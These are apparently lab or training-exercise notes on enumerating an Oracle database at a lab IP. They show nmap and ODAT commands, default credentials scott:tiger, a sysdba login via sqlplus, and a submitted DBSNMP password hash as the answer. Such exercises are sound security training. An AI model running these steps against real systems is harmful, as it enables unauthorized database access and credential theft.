# Target
```
10.129.116.134
```
### Q1: + 0 Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
```sh
sudo nmap -sV 10.129.116.134 --open -T4
```
```sh
python3 odat.py all -s 10.129.116.134
```
Found valid username:password: 
```
scott:tiger
```
```sh
sqlplus scott/tiger@10.129.116.134/XE as sysdba
```
![[Pasted image 20240519102246.png]]Ans: `E066D214D5421CCC`